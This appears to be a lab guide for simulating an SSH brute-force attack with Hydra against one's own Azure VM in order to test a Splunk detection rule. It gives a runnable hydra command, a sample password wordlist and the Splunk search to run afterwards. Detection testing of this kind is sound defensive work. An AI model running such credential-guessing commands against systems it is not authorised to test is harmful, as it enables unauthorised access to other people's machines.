# Attack Simulation — SSH Brute Force

This guide shows how to simulate an SSH brute force attack against your Azure VM to generate real log data and test the detection rule.

> **Important:** Only run this simulation against your own Azure VM that you own and control. Never run this against any system you don't have explicit permission to test.

---

## What This Simulates

A hacker using the **Hydra** tool to automatically try hundreds of SSH username/password combinations, attempting to gain unauthorized access to your VM.

MITRE ATT&CK Technique: **T1110 — Brute Force**

---

## Tools Required

- A second Linux machine (attacker machine) — can be another Azure VM or local Linux
- Hydra tool (`sudo apt install hydra`)
- A wordlist file (e.g., `/usr/share/wordlists/rockyou.txt`)

---

## Steps

### Step 1 — Set up attacker machine

On a second Linux VM:
```bash
sudo apt update && sudo apt install hydra -y
```

### Step 2 — Create a small password wordlist for testing

```bash
cat > test-passwords.txt << EOF
password
123456
admin
welcome
Password1
letmein
qwerty
test123
EOF
```

### Step 3 — Run Hydra against the target VM

Replace `<target-vm-ip>` with your Azure VM's IP address:
```bash
hydra -l admin -P test-passwords.txt ssh://<target-vm-ip> -t 4 -V
```

This will attempt SSH login as user `admin` using each password in the list. All attempts will be logged in `/var/log/auth.log` on the target VM.

---

## What to Expect in Splunk

After running the simulation, search Splunk for:
```
index=main sourcetype=linux_secure "Failed password"
```

You should see multiple failed login entries from the attacker's IP. The `brute-force.spl` detection rule will trigger an alert.

---

## Verification

Run the brute-force.spl query in Splunk. You should see:
- `src_ip` = your attacker machine's IP
- `failed_attempts` = number of password attempts
- `severity` = MEDIUM, HIGH, or CRITICAL depending on count
